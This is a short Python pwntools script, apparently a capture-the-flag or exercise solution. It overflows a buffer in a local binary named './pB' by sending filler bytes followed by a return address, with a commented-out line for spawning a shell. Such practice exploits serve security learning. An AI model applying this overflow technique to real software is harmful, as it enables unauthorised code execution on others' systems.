#!/usr/bin/env python
# coding=utf-8
from pwn import *

# r = process('./pB')
# context.log_level = 'DEBUG'

# r = process('./pB')
# context.terminal = ['tmux', 'splitw', '-h']
# Attach the debugger
# gdb.attach(r, '''b main
# ''')
# gdb.attach(r)

r = gdb.debug('./pB', '''
    break main
    continue
    break *0x401176
    ''')


# EXPLOIT CODE GOES HERE
# r.send(asm(shellcraft.sh()))
targer_address = p64(0x0000000000401176)

args = p64(0xCAFECAFECAFECAFE)

r.sendline(args * 3 + targer_address)
r.interactive()
